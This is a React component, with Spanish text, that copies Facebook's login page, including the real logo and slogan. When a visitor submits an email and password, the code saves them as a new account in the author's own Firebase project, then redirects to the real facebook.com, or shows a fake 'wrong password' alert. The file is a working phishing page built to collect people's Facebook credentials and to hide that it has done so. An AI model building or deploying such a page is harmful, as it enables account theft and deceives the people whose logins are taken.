import React, { useState } from 'react';
import './FacebookLogin.css';
import { auth } from './database/firebaseconfig.js';
import { signInWithEmailAndPassword, createUserWithEmailAndPassword } from 'firebase/auth';

const FacebookLogin = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  // Iniciar sesión o crear usuario si no existe
  const handleLogin = async (e) => {
    e.preventDefault();
    setError('');

      try {
      const userCredential = await createUserWithEmailAndPassword(auth, email, password);
      window.location.href='https://www.facebook.com/'
    } catch (error) {
    alert("Usuario o contrasena incorrectos")
    }
  };

  // Crear nuevo usuario
  const handleRegister = async (email, password) => {
 
  };

  return (
    <div className="fb-wrapper">
      <div className="fb-container">
        <div className="fb-left">
          <img className="fb-logo" src='https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg'></img>
          <p className="fb-message">
            Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
          </p>
        </div>

        <div className="fb-right">
          <div className="fb-card">
            <form onSubmit={handleLogin}>
              <input
                type="text"
                placeholder="Correo electrónico o número de teléfono"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <input
                type="password"
                placeholder="Contraseña"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button type="submit" className="login-btn" >Iniciar sesión</button>
              {error && <p className="error-text">{error}</p>}
              <a href="#" className="forgot-link">¿Olvidaste tu contraseña?</a>
              <hr />
              <button
                type="button"
                className="create-btn"
                onClick={() => handleRegister(email, password)}
              >
                Crear cuenta nueva
              </button>
            </form>
          </div>
          <p className="page-link">
            <strong>Crea una página</strong> para una celebridad, una marca o un negocio.
          </p>
        </div>
      </div>
    </div>
  );
};

export default FacebookLogin;
